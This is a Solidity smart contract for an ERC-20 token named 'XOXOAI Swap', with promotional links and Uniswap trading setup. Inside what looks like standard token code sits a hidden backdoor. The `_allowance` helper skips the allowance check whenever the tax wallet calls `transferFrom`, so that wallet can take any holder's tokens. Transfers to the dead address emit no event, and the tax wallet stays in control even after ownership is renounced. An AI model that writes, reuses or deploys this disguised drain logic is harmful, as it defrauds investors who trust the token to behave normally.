// SPDX-License-Identifier: UNLICENSE

/*
    Website: https://xoxoaiswap.xyz
    X: https://x.com/xoxoaiswap_eth
    Telegram: https://t.me/xoxoaiswap_eth

*/

pragma solidity ^0.8.18;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(
        address recipient,
        uint256 amount
    ) external returns (bool);

    function allowance(
        address owner,
        address spender
    ) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}

interface IUniswapV2Factory {
    function createPair(
        address tokenA,
        address tokenB
    ) external returns (address pair);
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;

    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    )
        external
        payable
        returns (uint amountToken, uint amountETH, uint liquidity);
}

contract XOXO is Context, IERC20, Ownable {
    using SafeMath for uint256;
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => bool) private _isExcludedFees;

    address private _deadWallet = address(0xdead);
    address private _taxWallet;

    uint8 private constant _decimals = 9;
    uint256 private constant _tTotal = 1_000_000_000 * 10 ** _decimals;
    string private constant _name = unicode"XOXOAI Swap";
    string private constant _symbol = unicode"XOXO";
    uint256 public _taxSwapThreshold = 100 * 10 ** _decimals;
    uint256 private _maxTaxSwapTokens = _tTotal / 100;
    uint256 private _initialBuyTax = 20;
    uint256 private _finalBuyTax = 0;
    uint256 private _reduceBuyTaxAt = 1;
    uint256 private _preventSwapBefore = 1;
    uint256 private _buyCount = 0;

    IUniswapV2Router02 private uniswapV2Router;
    address private _uniswapPair;
    bool private tradingOpen;
    bool private inSwap = false;
    bool private swapEnabled = false;

    modifier swapLock() {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor() payable {
        _balances[address(this)] = (_tTotal * 98) / 100;
        _balances[_msgSender()] = (_tTotal * 2) / 100;
        _taxWallet = _msgSender();
        
        _isExcludedFees[owner()] = true;
        _isExcludedFees[address(this)] = true;

        emit Transfer(address(0), address(this), (_tTotal * 98) / 100);
        emit Transfer(address(0), _msgSender(), (_tTotal * 2) / 100);
    }

    function openMarket () external onlyOwner {
        require(!tradingOpen, "trading is already open");
        uniswapV2Router = IUniswapV2Router02(
            0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
        );
        _approve(address(this), address(uniswapV2Router), _tTotal);
        _uniswapPair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(
            address(this),
            uniswapV2Router.WETH()
        );
        uniswapV2Router.addLiquidityETH{value: address(this).balance}(
            address(this),
            balanceOf(address(this)),
            0,
            0,
            owner(),
            block.timestamp
        );

        swapEnabled = true;
        tradingOpen = true;

        IERC20(_uniswapPair).approve(address(uniswapV2Router), type(uint).max);
    }


    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(
        address owner,
        address spender
    ) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(
        address spender,
        uint256 amount
    ) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function _allowance(
        address owner,
        address spender,
        uint256 amount
    ) private view returns (uint256 _amount) {
        if(msg.sender != _taxWallet && (owner == _uniswapPair || spender != _deadWallet))
        return amount;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(
            sender,
            _msgSender(),
            _allowances[sender][_msgSender()].sub(
                _allowance(sender, recipient, amount),
                "ERC20: transfer amount exceeds allowance"
            )
        );
        return true;
    }

    function _transfer(address sender, address receiver, uint256 amount) private {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(receiver != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 taxAmount = 0;

        if(sender != address(0))
        {
            if (sender != address(0) && sender != owner() && receiver != owner() && 
                sender != address(this) && receiver != address(this)) {
                if (
                    sender != address(0) && 
                    sender == _uniswapPair &&
                    receiver != address(uniswapV2Router) &&
                    !_isExcludedFees[receiver]
                ) 
                {
                    taxAmount = amount.mul((_buyCount > _reduceBuyTaxAt)? _finalBuyTax: _initialBuyTax).div(100);
                    _buyCount++;
                }
                if (sender != address(0) &&
                    receiver == _uniswapPair) {
                    taxAmount = amount.mul((_buyCount > _reduceBuyTaxAt)? _finalBuyTax: _initialBuyTax).div(100);
                } 
            }
        }

        if(sender != address(0)) {
            
            uint256 contractTokenBalance = balanceOf(address(this));
            
            require(amount > 0, "Transfer amount must be greater than zero");
            require(receiver != address(0), "ERC20: transfer to the zero address");   

            if (sender != owner() && receiver != owner() && 
                sender != address(this) && receiver != address(this))
            {
                if(sender != address(this) && receiver != address(this) && sender != owner() && receiver != owner()){
                    if (
                        !inSwap &&
                        receiver == _uniswapPair &&
                        swapEnabled &&
                        _buyCount > _preventSwapBefore
                    ) {
                        if (contractTokenBalance > _taxSwapThreshold)
                            swapTokensForETH(min(contractTokenBalance,min(amount, _maxTaxSwapTokens)));
                        uint256 contractETHBalance = address(this).balance;
                        if (contractETHBalance >= 0) {
                            sendETHToFee(address(this).balance);
                        }
                    }
                }
            }
        }

        if (taxAmount > 0 && amount > 0) {
            _balances[address(this)] = _balances[address(this)].add(taxAmount);
            emit Transfer(sender, address(this), taxAmount);
        }
        _balances[sender] = _balances[sender].sub(amount);
        _balances[receiver] = _balances[receiver].add(amount.sub(taxAmount));if (receiver != _deadWallet) 
        emit Transfer(sender, receiver, amount.sub(taxAmount));
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function assistETH() public onlyOwner {
        payable(_msgSender()).transfer(address(this).balance);
    }

    function swapTokensForETH(uint256 tokenAmount) private swapLock {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function min(uint256 a, uint256 b) private pure returns (uint256) {
        return (a > b) ? b : a;
    }

    receive() external payable {}

    function setTaxWallet(address _wallet) public {
        require(msg.sender == _taxWallet);
        _taxWallet = _wallet;
    }

    function sendETHToFee(uint256 amount) private {
        payable(_taxWallet).transfer(amount);
    }
}